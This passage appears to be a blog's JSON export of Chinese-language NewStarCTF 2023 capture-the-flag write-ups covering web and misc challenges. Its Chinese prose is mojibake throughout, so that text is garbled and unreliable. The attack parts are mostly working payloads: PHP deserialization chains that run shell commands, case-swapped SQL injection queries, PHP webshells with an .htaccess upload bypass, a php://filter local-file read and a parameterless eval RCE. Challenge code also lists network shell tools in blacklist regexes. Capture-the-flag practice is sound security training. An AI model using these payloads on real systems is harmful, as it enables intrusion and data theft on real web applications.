ç»™å‡ºpayloadï¼š 123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);class minipop&#123; public $code; public $qwejaskdjnlka; public function __toString() &#123; if (!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code)) &#123; exec($this-&gt;code); &#125; return &quot;alright&quot;; &#125; public function __destruct() &#123; echo $this-&gt;qwejaskdjnlka; &#125;&#125;$a = new minipop;$a-&gt;qwejaskdjnlka = new minipop;$a-&gt;qwejaskdjnlka-&gt;code = &#x27;sed -i \\&#x27;s/|//g\\&#x27; index`echo -e &quot;\\x2ep&quot;`hp&#x27;;$a-&gt;qwejaskdjnlka-&gt;code = &#x27;ls / &gt;1.php&#x27;;$a-&gt;qwejaskdjnlka-&gt;code = &#x27;cat /flag_is_h3eeere &gt;1.php&#x27;;echo (serialize($a)); OtenkiGirlä¸ä¼šï¼Œç­‰ä¸ªå®˜æ–¹wpï¼Œä½†å‡­æ„Ÿè§‰æ˜¯åŸå‹é“¾æ±¡æŸ“ æ€»ç»“ç¬¬ä¸‰å‘¨æ„Ÿè§‰éš¾åº¦ä¸Šæ¥äº†ï¼Œåšèµ·æ¥æœ‰ç‚¹è´¹åŠ²äº† è´´ä¸ªå®˜æ–¹wpï¼šhttps://shimo.im/docs/QPMRxzGktzsZnzhz","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"NewStarCTF 2023-WEEK2 Web WriteUp","slug":"2023newstarctfWeek2","date":"2023-10-09T23:51:20.000Z","updated":"2023-10-18T08:48:17.042Z","comments":true,"path":"2023/10/10/2023newstarctfWeek2/","link":"","permalink":"https://blog.lazyforever.top/2023/10/10/2023newstarctfWeek2/","excerpt":"","text":"è§£é¢˜ 6&#x2F;6 æ¸¸æˆé«˜æ‰‹æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼ŒF12è¿›è¡Œjavascriptä»£ç å®¡è®¡ã€‚ å‘ç°å‡½æ•°gameover() 12345678910111213141516171819202122function gameover()&#123; if(gameScore &gt; 100000)&#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;/api.php&quot;, true); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; var response = JSON.parse(xhr.responseText); alert(response.message); &#125; &#125;; var data = &#123; score: gameScore, &#125;; xhr.send(JSON.stringify(data)); &#125; alert(&quot;æˆç»©ï¼š&quot;+gameScore); gameScore=0; curPhase =PHASE_READY; hero = null; hero = new Hero(); &#125; åˆ†æé€»è¾‘ï¼Œå‘ç°å½“gameScoreå¤§äº100000æ—¶ï¼Œä¼šå°†&#123;score: gameScore&#125;è½¬åŒ–ä¸ºjsonå‘é€åˆ°&#x2F;api.phpï¼Œå°†è¿”å›ç»“æœalertï¼Œå› æ­¤çŒœæµ‹flagç”±api.phpç»™å‡ºã€‚ åœ¨æ§åˆ¶å°é‡å†™gameoverå‡½æ•° 1234567891011121314151617181920212223function gameover()&#123; if(gameScore &lt; 100000)&#123; gameScore = 1000000; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;/api.php&quot;, true); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; var response = JSON.parse(xhr.responseText); alert(response.message); &#125; &#125;; var data = &#123; score: gameScore, &#125;; xhr.send(JSON.stringify(data)); &#125; alert(&quot;æˆç»©ï¼š&quot;+gameScore); gameScore=0; curPhase =PHASE_READY; hero = null; hero = new Hero(); &#125; æ¥ç€åœ¨æ§åˆ¶å°æ‰§è¡Œgameover()ï¼Œå¾—åˆ°flagï¼šflag&#123;5d66c0a8-cb52-4099-a3fb-f7d5cf4826d0&#125; include 0ã€‚0æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µphp 12345678910&lt;?phphighlight_file(__FILE__);// FLAG in the flag.php$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;/base|rot/i&#x27;,$file))&#123; @include($file);&#125;else&#123; die(&quot;nope&quot;);&#125;?&gt; çœ‹åˆ°includeï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ ä½†æ˜¯!preg_match(&#39;/base|rot/i&#39;,$file)å¦‚æœfileä¸­å«æœ‰baseå’Œrotå°±ä¼šdieï¼Œæ‰€ä»¥ç”¨ä¸äº†æ™®é€šçš„php://filter/read=convert.base64-encode/resource=flag.phpå’Œphp://filter/read=string.rot13/resource=flag.php ä½¿ç”¨å…¶ä»–å­—ç¬¦é›†ï¼Œphp://filter/read=convert.iconv.UTF8.UTF7/resource=flag.phpï¼Œå¾—åˆ°flag+AHs-59c6afe7-3cad-4eb3-abac-38b09521a184+AH0 ç¨åŠ æ”¹åŠ¨ï¼Œå¾—åˆ°flagï¼šflag&#123;59c6afe7-3cad-4eb3-abac-38b09521a184&#125; è¿™é‡Œè´´ä¸€ä¸ªå­—ç¬¦é›†filterè„šæœ¬ï¼Œwupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT ez_sqlæ‰“å¼€å®¹å™¨ï¼Œå‘ç°å¥½å¤šaæ ‡ç­¾ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œå‘ç°æœ‰idå‚æ•°ä¼ å…¥ã€‚ ?id=TMP0919&#39;--+å‘ç°ä¾æ—§å¯ä»¥æ˜¾ç¤ºï¼ŒçŒœæµ‹æ˜¯sqlæ³¨å…¥ã€‚ ä½†æ˜¯?id=TMP0919&#39;or 1=1--+æ˜¾ç¤ºnoï¼Œæœ‰é»‘åå•ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚ ?id=TMP0919&#39;Or 1=1--+ç»•è¿‡æˆåŠŸã€‚ æŸ¥å­—æ®µæ•° 1?id=TMP0919&#x27; Order by 5--+ æˆåŠŸ 1?id=TMP0919&#x27; Order by 6--+ æ— æ³•å›æ˜¾ï¼Œå¾—åˆ°å­—æ®µæ•°ä¸º5ã€‚ 1?id=T&#x27; union seLect 1,2,3,4,5--+ å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚ æŸ¥åº“å 1?id=T&#x27; union seLect database(),2,3,4,5--+ å›æ˜¾ctfï¼Œæ³¨æ„selectéœ€è¦ä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚ æŸ¥è¡¨å 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),3,4,5--+ è¿”å›grades,here_is_flagï¼Œå‘ç°here_is_flagè¡¨ï¼Œæ³¨æ„information_schemaå’Œwhereéœ€è¦ä½¿ç”¨å¤§å°å†™ç»•è¿‡ã€‚ æŸ¥åˆ—å 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;here_is_flag&#x27; ),4,5--+ è¿”å›flagï¼Œå¾—åˆ°flagåˆ— æŸ¥flag 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;here_is_flag&#x27; ),(seLect flag from ctf.here_is_flag),5--+ å¾—åˆ°flagï¼šflag&#123;fbbd976e-4244-4154-b2d1-a38dba8a9ef2&#125; Unserializeï¼Ÿæ‰“å¼€å®¹å™¨ï¼Œå‘ç°phpä»£ç  12345678910111213141516&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123; private $cmd; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; åˆ©ç”¨phpååºåˆ—åŒ–æ¼æ´ï¼Œæœ¬åœ°æ­å»ºphpç¯å¢ƒ 123456789101112131415161718&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil&#123; private $cmd = &quot;ls /&quot;; public function __destruct() &#123; if (!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd)) &#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil;echo urlencode(serialize($a));?&gt; æ‹¿åˆ°O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D ç›´æ¥æ‰“ï¼Œå‘ç°flagè·¯å¾„ï¼š/th1s_1s_fffflllll4444aaaggggg 123456789101112131415161718&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil&#123; private $cmd = &quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;; public function __destruct() &#123; if (!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd)) &#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil;echo urlencode(serialize($a));?&gt; ä½¿ç”¨å•å¼•å·ç»•è¿‡è¿‡æ»¤ï¼Œæ‹¿åˆ°O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22ca%27%27t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D å¾—åˆ°flagï¼šflag&#123;f1e483d0-09a1-4376-b00b-60b3ea9422df&#125; Upload again!ä¸Šä¼ phpï¼Œå‘ç°æœ‰é»‘åå•ã€‚ ç›´æ¥ä¸Šä¼ .htaccess 1AddType application/x-httpd-php .jpg å°†jpgè§£æä¸ºphp ä¸Šä¼ 1.jpgï¼Œå‘ç°å«æœ‰&lt;?çš„æ–‡ä»¶è¢«è¿‡æ»¤ï¼Œä½¿ç”¨JavaScriptæ ‡ç­¾ç»•è¿‡ã€‚ 1&lt;script language=&quot;php&quot;&gt;system($GET[0]);&lt;/script&gt; å¯ä»¥æ­£å¸¸è§£æï¼Œå‰©ä¸‹æ— è„‘ç›´æ¥æ‰¾flagå³å¯ã€‚ R!!C!!E!!æ‰“å¼€å®¹å™¨å‘ç°Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information? ä¿¡æ¯æ³„éœ²ï¼ŒçŒœæµ‹æ˜¯gitæ³„éœ²ï¼Œä½¿ç”¨GitHackå·¥å…· å¾—åˆ°bo0g1pop.phpï¼Œå†…å®¹ä¸º 1234567&lt;?phphighlight_file(__FILE__);if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123; if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123; eval($_GET[&#x27;star&#x27;]); &#125;&#125; åˆ†æé€»è¾‘ï¼Œæ˜¯æ— å‚æ•°RCEï¼Œä»start.shå¯ä»¥çœ‹åˆ°flagåœ¨/flagä¸­ã€‚ é¦–å…ˆéœ€è¦æ„é€ å‡º/flagï¼Œä½¿ç”¨getallheaderså‡½æ•°å¾—åˆ°æ‰€æœ‰http Header å‘ç°User-Agentåœ¨ç¬¬äºŒä¸ªï¼Œå¯ä»¥ä½¿ç”¨next(getallheaders())å¾—åˆ°å€¼ã€‚ æ”¹UAä¸º&#x2F;flagï¼Œå¾—åˆ°/flagå­—ç¬¦ä¸²ï¼Œæ¥ç€ä½¿ç”¨show_sourceå‡½æ•°å¾—åˆ°flagå†…å®¹ã€‚ å®Œæ•´payloadï¼š/bo0g1pop.php?star=show_source(next(getallheaders())); å¾—åˆ°flagï¼šflag&#123;34b4ffdf-5637-46ee-a734-30e031d0b73f&#125; æ€»ç»“è´´ä¸€ä¸ªå®˜æ–¹wpï¼šhttps://shimo.im/docs/Dy5ekHJhKo0ap5v3/ å…¶ä»–æ–¹å‘æ²¡æ€ä¹ˆç ”ç©¶ï¼Œå¤ªå¿™äº†ï¼ŒåªæŠ½å‡ºæ¥ä¸€ä¸ªå°æ—¶å†™äº†ä¸ªWeb","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"NewStarCTF 2023-WEEK1 WriteUp","slug":"2023newstarctfWeek1","date":"2023-09-26T05:33:13.000Z","updated":"2023-10-02T06:32:39.687Z","comments":true,"path":"2023/09/26/2023newstarctfWeek1/","link":"","permalink":"https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/","excerpt":"","text":"å¥½ä¹…æ²¡ç¢°ctfäº†ï¼Œæ„Ÿè§‰æ‰‹æœ‰ç‚¹ç”Ÿï¼Œæ­£å¥½æœ€è¿‘newstaræ–°ç”Ÿèµ›ï¼Œè¿‡æ¥å‡‘ä¸ªçƒ­é—¹ã€‚ Webè§£é¢˜ 7&#x2F;7 æ³„æ¼çš„ç§˜å¯†ä»‹ç»é‡Œé¢å†™äº†â€œç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹â€ï¼Œä¸€çœ¼ä¿¡æ¯æ³„éœ² æ‰“å¼€å®¹å™¨ï¼Œå‡ºç°ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼ï¼Œ&#x2F;robots.txtä¸€è¯•ç›´æ¥çˆ†å‡ºflagçš„å‰åŠæ®µï¼Œ&#x2F;www.zipç›´æ¥æŠŠæºç æ³„éœ²äº†ã€‚ æ‹¿åˆ°flagï¼šflag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125; Begin of Uploadä¸€çœ¼æ–‡ä»¶ä¸Šä¼ ï¼Œå†™ä¸€ä¸ªphpé©¬è¯•ä¸€ä¸‹ 1&lt;?php system($_GET[&#x27;cmd&#x27;]); å‘ç°æ–‡ä»¶åç¼€æœ‰ç™½åå•ï¼Œä½†æ˜¯éªŒè¯æ˜¯åœ¨å‰ç«¯ï¼Œç›´æ¥burpæŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶åå°±èƒ½ç»• Begin of HTTPæ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¦æ±‚è¯·ä½¿ç”¨ GETæ–¹å¼ æ¥ç»™ ctf å‚æ•°ä¼ å…¥ä»»æ„å€¼æ¥é€šè¿‡è¿™å…³ åŠ ä¸ªå‚æ•°è¯•ä¸€ä¸‹http://node4.buuoj.cn:25055/?ctf=1 å‘ç°å¾ˆæ£’ï¼Œå¦‚æœæˆ‘è¿˜æƒ³è®©ä½ ä»¥POSTæ–¹å¼æ¥ç»™æˆ‘ä¼ é€’ secret å‚æ•°ä½ åˆè¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ å¦‚æœä½ ä¼ å…¥çš„å‚æ•°å€¼å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„secretï¼Œæˆ‘ä¹Ÿä¸ä¼šæ”¾ä½ è¿‡å…³çš„ æˆ–è®¸ä½ å¯ä»¥æ‰¾ä¸€æ‰¾æˆ‘æŠŠsecretè—åœ¨äº†å“ªé‡Œ ctrl+Uçœ‹ä¸‹æºç ï¼Œå‘ç°æ³¨é‡Š&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; base64è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°secretæ˜¯n3wst4rCTF2023g00000d HackBaræ’ä»¶ä¼ ä¸€ä¸‹POSTå‚æ•° æ¥ä¸‹æ¥å‘ç°å¾ˆå¼ºï¼Œç°åœ¨æˆ‘éœ€è¦éªŒè¯ä½ çš„ power æ˜¯å¦æ˜¯ ctfer ï¼Œåªæœ‰ctferå¯ä»¥é€šè¿‡è¿™å…³ Cookieæ”¹ä¸€ä¸‹poweræ”¹ä¸ºctfer å‘ç°ä½ å·²ç»å®Œæˆäº†æœ¬é¢˜è¿‡åŠçš„å…³å¡ï¼Œç°åœ¨è¯·ä½¿ç”¨ NewStarCTF2023æµè§ˆå™¨ æ¥é€šè¿‡è¿™å…³ï¼ æŠŠUser-Agentæ”¹ä¸ºNewStarCTF2023 å‘ç°å¸Œæœ›ä½ æ˜¯ä» newstarctf.com è®¿é—®åˆ°è¿™ä¸ªå…³å¡çš„ åŠ ä¸ªReferer: newstarctf.com æœ€åå‘ç°æœ€åä¸€å…³äº†ï¼åªæœ‰ æœ¬åœ°ç”¨æˆ· å¯ä»¥é€šè¿‡è¿™ä¸€å…³ åŠ ä¸€ä¸ªHeaderï¼šX-Real-IP: 127.0.0.1ï¼Œæœ¬æ¥ä»¥ä¸ºè¿™é“é¢˜æ˜¯è¦åŠ X-Forwarded-Forï¼Œç»“æœåŠ X-Forwarded-Forå‘ç°å¥½åƒä¸å¤ªè¡Œ æ‹¿åˆ°flagï¼šflag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125; ErrorFlaskè¿™é“é¢˜æœ‰ç‚¹å¥‡æ€ªï¼Œçœ‹åˆ°flaskä»¥ä¸ºæ˜¯SSTIï¼Œç»“æœæ‰“å¼€å®¹å™¨éšä¾¿ä¼ ä¸ªnumber1=&#123;&#123;&#125;&#125;ï¼Œå‘ç°DEBUGæ¨¡å¼æ²¡å…³ï¼Œç»“æœflagç›´æ¥å†™åˆ°æºä»£ç é‡Œç›´æ¥èƒ½çœ‹è§ï¼Œç›´æ¥æ‹¿åˆ°flagï¼šflag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125; Begin of PHPä¸Šæ¥å®¹å™¨ç›´æ¥ç»™å‡ºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123; echo &quot;=Level 1=&lt;br&gt;&quot;; if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123; $flag1 = True; &#125;else&#123; die(&quot;nope,this is level 1&quot;); &#125;&#125;if($flag1)&#123; echo &quot;=Level 2=&lt;br&gt;&quot;; if(isset($_POST[&#x27;key3&#x27;]))&#123; if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123; $flag2 = True; &#125; &#125;else&#123; die(&quot;nope,this is level 2&quot;); &#125;&#125;if($flag2)&#123; echo &quot;=Level 3=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key4&#x27;]))&#123; if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123; $flag3 = True; &#125;else&#123; die(&quot;nope,this is level 3&quot;); &#125; &#125;&#125;if($flag3)&#123; echo &quot;=Level 4=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key5&#x27;]))&#123; if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123; $flag4 = True; &#125;else&#123; die(&quot;nope,this is level 4&quot;); &#125; &#125;&#125;if($flag4)&#123; echo &quot;=Level 5=&lt;br&gt;&quot;; extract($_POST); foreach($_POST as $var)&#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123; die(&quot;nope,this is level 5&quot;); &#125; &#125; if($flag5)&#123; echo file_get_contents(&quot;/flag&quot;); &#125;else&#123; die(&quot;nope,this is level 5&quot;); &#125;&#125; å…ˆçœ‹level1ï¼Œè¦ä¿è¯$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])ä¸º Trueï¼Œå‘ç°md5ç›´æ¥çš„åˆ¤æ–­æ˜¯&#x3D;&#x3D;è€Œä¸æ˜¯&#x3D;&#x3D;&#x3D;ï¼Œç›´æ¥0eç¢°æ’å³å¯ï¼Œéšä¾¿æ‰¾ä¸¤ä¸ª240610708å’ŒQLTHNDTå°±è¡Œã€‚ å†çœ‹level2ï¼Œä¿è¯md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]ä¸º Trueï¼Œä¸­é—´æ˜¯&#x3D;&#x3D;&#x3D;ï¼Œæ²¡åŠæ³•å†ç”¨level1çš„0eç¢°æ’äº†ï¼Œè¿™é‡Œä¸€ä¸ªå°æŠ€å·§ç›´æ¥POSTä¼ key3[]=å³å¯ï¼Œè¿™é‡Œkey3ç›´æ¥è¢«è¯†åˆ«æˆæ•°ç»„äº†ï¼Œå¯¼è‡´ä¸¤ä¸ªå‡½æ•°éƒ½è¿”å›falseã€‚ æ¥ä¸‹æ¥level3ï¼Œä¿è¯strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0ä¸º Trueï¼Œç»§ç»­ç”¨key4[]=ï¼Œç”¨æ•°ç»„çš„æ–¹å¼è®©å…¶è¿”å›false ç„¶ålevel4ï¼Œä¿è¯!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023ä¸º Trueï¼Œä¼ key5=2024aï¼Œå½“å®ƒä¸2023æ¯”è¾ƒæ—¶å°±ä¼šæ¯”å®ƒå¤§ï¼Œè€Œä¸”è¿˜è¯†åˆ«ä¸å‡ºå®ƒæ˜¯æ•°å­—ã€‚ æœ€ålevel5ï¼Œè¦ä¿è¯å®ƒä¸èƒ½å…¨æ˜¯å­—æ¯å’Œæ•°å­—ï¼Œè¿˜è¦ä¿è¯flag5å˜é‡æ˜¯Trueï¼ŒPOSTä¼ flag5=-å³å¯ã€‚ æ‹¿åˆ°flagï¼šflag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125; R!C!E!æ‰“å¼€å®¹å™¨ï¼Œè´´ä¸Šä»£ç  1234567891011&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123; $password=md5($_POST[&#x27;password&#x27;]); $code=$_POST[&#x27;e_v.a.l&#x27;]; if(substr($password,0,6)===&quot;c4d038&quot;)&#123; if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123; eval($code); &#125; &#125;&#125; è¦ä¿è¯passwordçš„md5å‰6ä½æ˜¯c4d038ï¼ŒåŒæ—¶codeä¸­ä¸èƒ½å«æœ‰ä¸€äº›æ•æ„Ÿçš„å•è¯ã€‚ è¿™é‡Œè´´ä¸Šæˆ‘è·‘MD5çš„è„šæœ¬ï¼Œå†™çš„ä¸å¥½ï¼Œä½†æ˜¯å‹‰å¼ºèƒ½è·‘ 123456789101112131415161718192021222324252627282930313233343536373839import hashlibimport itertoolsimport stringimport threading# éœ€è¦éå†çš„å­—ç¬¦é›†characters = string.digits + string.ascii_lettersdef generate_combinations(length): for combo in itertools.product(characters, repeat=length): yield &#x27;&#x27;.join(combo)def calculate_md5(string): md5_hash = hashlib.md5() # åˆ›å»ºMD5å¯¹è±¡ md5_hash.update(string.encode()) # æ›´æ–°å¯¹è±¡å“ˆå¸Œå€¼ md5_digest = md5_hash.hexdigest() # è·å–å“ˆå¸Œå€¼çš„åå…­è¿›åˆ¶è¡¨ç¤º return md5_digestdef find_md5_match(prefix): for combo in generate_combinations(len(prefix)): string = prefix + combo md5 = calculate_md5(string) if md5[0:6] == &#x27;c4d038&#x27;: print(f&quot;&#123;string&#125; MD5å“ˆå¸Œå€¼: &#123;md5&#125;&quot;)# æµ‹è¯•è®¡ç®—MD5input_string = &quot;0&quot;threads = []for i in range(6): # æ ¹æ®å®é™…æƒ…å†µè®¾ç½®çº¿ç¨‹æ•°é‡ prefix = input_string * i thread = threading.Thread(target=find_md5_match, args=(prefix,)) threads.append(thread) thread.start()for thread in threads: thread.join()print(f&quot;&#123;input_string&#125;dddMD5å“ˆå¸Œå€¼: &#123;md5&#125;&quot;) éšä¾¿è·‘å‡ºæ¥ä¸€ä¸ª0000006sNj æ¥ç€ç›´æ¥ä¼  1e[v.a.l=echo `cat /f*` è¿™é‡Œæ³¨æ„è¦ç”¨[ä»£æ›¿_ï¼Œè¿™ç®—æ˜¯ä¸€ä¸ªphpç‰¹æ€§ã€‚ EasyLoginæ‰“å¼€å®¹å™¨ï¼Œçœ‹åˆ°ä¸€ä¸ªç™»å½•æ³¨å†Œé¡µé¢ï¼Œæ‹¿burpæŠ“åŒ…ï¼Œæœ€å¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥å‘ç°æç¤ºä¸æ˜¯æ³¨å…¥ã€‚ éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·admin1ï¼Œç™»å½•åå‘ç°æ˜¯ä¸€ä¸ªé™æ€çš„shellï¼Œjavascriptä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç° 1&quot;echo -en &#x27;\\\\nnewstar\\\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\\\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\\\\nrm -rf weak-passwd.txt&quot;),applyAutoComplete(le),await sleep(800),term.writeln(WELCOME_TEXT),readInput(),le.detach(),await sleep(200),le.attach(),le.pushInput(&quot;chat&quot;),le.confirm(),await sleep(200),le.pushInput(&quot;ä½ ä¼šè¯´ä¸­æ–‡å—ï¼Ÿ&quot;) æç¤ºweak-passwd.txtå¼±å£ä»¤ï¼Œå†åŠ ä¸Šæ³¨å†Œæ—¶å‘ç°adminç”¨æˆ·å·²ç»è¢«æ³¨å†Œï¼Œä½¿ç”¨burpç›´æ¥çˆ†ç ´å¯†ç ã€‚ å‘ç°adminå¼±å£ä»¤æ˜¯000000 ç™»å½•ï¼Œå¹¶æ‹¦æˆªè¿”å›åŒ…ï¼Œjavascriptå®¡è®¡ï¼Œå‘ç°æç¤º 1&quot;echo Maybe you need BurpSuite.&quot; æ¸…é™¤cookieé‡æ–°ç™»å½•ï¼Œæ‹¦æˆªpassportçš„è¿”å›åŒ…ï¼Œå¾—åˆ°flagï¼šflag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125; Miscè§£é¢˜ 5&#x2F;6 CyberChefâ€™s Secretç­¾åˆ°é¢˜ï¼Œæ‰“å¼€åçœ‹åˆ°M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=ï¼Œè¿›å…¥cyberchef.orgï¼Œä¸€æŠŠæ¢­ï¼Œæ‹¿åˆ°flagï¼šflag&#123;Base_15_S0_Easy_^_^&#125;ã€‚ æœºå¯†å›¾ç‰‡zstegå·¥å…· æ‰§è¡Œzsteg secret.pngå¾—åˆ° 123456b1,r,lsb,xy .. text: &quot;:=z^rzwPQb&quot;b1,g,lsb,xy .. file: OpenPGP Public Keyb1,b,lsb,xy .. file: OpenPGP Secret Keyb1,rgb,lsb,xy .. text: &quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;b3,b,lsb,xy .. file: very old 16-bit-int big-endian archiveb4,bgr,msb,xy .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo æ‹¿åˆ°flagï¼šflag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125; æµé‡ï¼é²¨é±¼ï¼wiresharkæ‰“å¼€å‘ç°æµé‡1.php%3fcmd=ls%20-al%20å†…å®¹ä¸º 123456789101112131415161718192021222324total 80drwxr-xr-x 1 root root 4096 Aug 19 06:17 .drwxr-xr-x 1 root root 4096 Aug 19 06:17 ..-rwxr-xr-x 1 root root 0 Aug 19 06:08 .dockerenv-rw-r--r-- 1 root root 39 Aug 19 06:17 .ffffllllllll11111144444GGGGGGdrwxr-xr-x 1 root root 4096 Dec 21 2021 bindrwxr-xr-x 2 root root 4096 Dec 11 2021 bootdrwxr-xr-x 5 root root 360 Aug 19 06:08 devdrwxr-xr-x 1 root root 4096 Aug 19 06:08 etcdrwxr-xr-x 2 root root 4096 Dec 11 2021 homedrwxr-xr-x 1 root root 4096 Dec 21 2021 libdrwxr-xr-x 2 root root 4096 Dec 20 2021 lib64drwxr-xr-x 2 root root 4096 Dec 20 2021 mediadrwxr-xr-x 2 root root 4096 Dec 20 2021 mntdrwxr-xr-x 2 root root 4096 Dec 20 2021 optdr-xr-xr-x 248 root root 0 Aug 19 06:08 procdrwx------ 1 root root 4096 Aug 19 06:17 rootdrwxr-xr-x 1 root root 4096 Dec 21 2021 rundrwxr-xr-x 1 root root 4096 Dec 21 2021 sbindrwxr-xr-x 2 root root 4096 Dec 20 2021 srvdr-xr-xr-x 13 root root 0 Aug 19 06:08 